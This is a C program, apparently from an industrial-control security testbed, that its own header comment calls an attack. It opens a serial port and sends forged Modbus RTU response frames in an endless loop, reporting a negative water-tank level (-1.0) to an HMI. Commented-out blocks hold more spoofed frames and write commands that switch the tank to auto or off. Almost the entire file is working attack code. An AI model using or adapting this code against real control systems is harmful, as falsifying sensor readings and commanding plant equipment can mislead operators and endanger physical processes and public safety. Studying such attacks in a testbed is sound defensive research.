/* This attack will insert a negative water level into the communication to the HMI */


#define FORLINUX
#include "modbus.h"
#define NUMPDU 2

int main(int argc, char *argv[]) {
  unsigned char  addr, fc, data[256], crc[2];
  int datalen;
  char inport[100], outport[100];


  int i, j, len, err;
  int port;
  struct modbus_pdu *pdu;

  strcpy(inport,"/dev/ttyS0");
  strcpy(outport,"/dev/ttyS1");
  
  for (i=1;i<argc;i++) {
    if (strcmp(argv[i], "-inport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      };
      strncpy(inport, argv[i+1],len); 
      i++;
      printf("INFO: Input port = %s\n", inport);
    } else if (strcmp(argv[i], "-outport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      };
      strncpy(outport, argv[i+1],len); 
      i++;
    } else {
      printf("ERROR: Illegal argument (%s)\n", argv[i]);
      printf("Usage: %s -inport /dev/ttyXX -outport /dev/ttyYY\n", argv[0]);
      return (-1);
    }
  }



//turn water tank to auto
//Address = 0x7, FC = 0x10, data length = 9
//Data = 
//0x8d75038: 0b
//0x8d75039: e9
//0x8d7503a: 0a
//0x8d7503b: 14
//0x8d7503c: 02
//0x8d7503d: 0a
//0x8d7503e: 0a
//0x8d7503f: 5a
//0x8d75040: 5a
//CRC = 
//0x8d750e0: b9
//0x8d750e1: 8d
//
//
//turn water tank off
//Address = 0x7, FC = 0x10, data length = 8
//Data = 
//0x917a050: 0b
//0x917a051: e9
//0x917a052: 0a
//0x917a053: 14
//0x917a054: 0a
//0x917a055: 0a
//0x917a056: 5a
//0x917a057: 5a
//CRC = 
//0x917a530: c0
//0x917a531: 35



 port = openport(outport);
  if (port < 0) { 
   return (port);
  }

  printf("open %s ok port = %d\n", outport, port);

 while (1) {  
    addr = (unsigned char) 0x7;
    fc = (unsigned char) 0x3;
    datalen = 21;
    data[0] = 0x14;
    data[1] = 0x10;
    data[2] = 0x00;
    data[3] = 0x0e;
    data[4] = 0x00;
    data[5] = 0x0b;
    data[6] = 0xf2;
    data[7] = 0x00;
    data[8] = 0x01;
    data[9] = 0x00;
    data[10] = 0x00;
    data[11] = 0x00;
    data[12] = 0x00;
    data[13] = 0x00;
    data[14] = 0x00;
    data[15] = 0xbf;
    data[16] = 0x80;
    data[17] = 0x00;
    data[18] = 0x00;
    data[19] = 0x00;
    data[20] = 0x00;
    crc[0] = 0x84;
    crc[1] = 0x77;

 pdu = mkpdu(addr, fc, data, datalen, crc);
// pdu->crc[0] = 0x30;
// pdu->crc[1] = 0x46;
 printmodbuspdu(pdu);
// calc_crc(pdu);
// printmodbuspdu(pdu);

 sendmodbus_RTU(port, pdu);    
 freepdu(pdu);
 sleep(1); // change to random time in the future.

 /*   addr = (unsigned char) 0x7;
    fc = (unsigned char) 0x10;
    datalen = 4;
    data[0] = 0x0b;
    data[1] = 0xe9;
    data[2] = 0x00;
    data[3] = 0x0a;
    //data[4] = 0x0a;
    //data[5] = 0x0a;
   // data[6] = 0x5a;
   // data[7] = 0x5a;
   crc[0] = 0x93;
   crc[1] = 0xb8;

 pdu = mkpdu(addr, fc, data, datalen, crc);
 //pdu->crc[0] = 0xc0;
//pdu->crc[1] = 0x35;
 printmodbuspdu(pdu);

 sendmodbus_RTU(port, pdu);    
 freepdu(pdu);
 //sleep(drand48()*5); // change to random time in the future.

*/
/* addr = (unsigned char) 0x7;
    fc = (unsigned char) 0x3;
    datalen = 21;
    data[0] = 0x14;
    data[1] = 0x10;
    data[2] = 0x10;
    data[3] = 0x0e;
    data[4] = 0x10;
    data[5] = 0x17;
    data[6] = 0xe7;
    data[7] = 0x00;
    data[8] = 0x01;
    data[9] = 0x00;
    data[10] = 0x00;
    data[11] = 0x00;
    data[12] = 0x00;
    data[13] = 0x00;
    data[14] = 0x00;
    data[15] = 0x42;
    data[16] = 0x91;
    data[17] = 0x5d;
    data[18] = 0xdf;
    data[19] = 0x00;
    data[20] = 0x00;
    crc[0] = 0x5b;
    crc[1] = 0x0f;
 pdu = mkpdu(addr, fc, data, datalen, crc);
// pdu->crc[0] = 0x30;
//  pdu->crc[1] = 0x46;
 printmodbuspdu(pdu);
//  calc_crc(pdu);
//   printmodbuspdu(pdu);

  sendmodbus_RTU(port, pdu);
   freepdu(pdu);
   sleep(1);



 addr = (unsigned char) 0x7;
    fc = (unsigned char) 0x10;
    datalen = 4;
    data[0] = 0x0b;
    data[1] = 0xe9;
    data[2] = 0x00;
    data[3] = 0x0a;
    //data[4] = 0x0a;
    //data[5] = 0x0a;
    //data[6] = 0x5a;
    //data[7] = 0x5a;
    crc[0] = 0x93;
    crc[1] = 0xb8;
   
  pdu = mkpdu(addr, fc, data, datalen, crc);
   printmodbuspdu(pdu);

 sendmodbus_RTU(port, pdu);
 freepdu(pdu);
 sleep(1);
*/


}
}
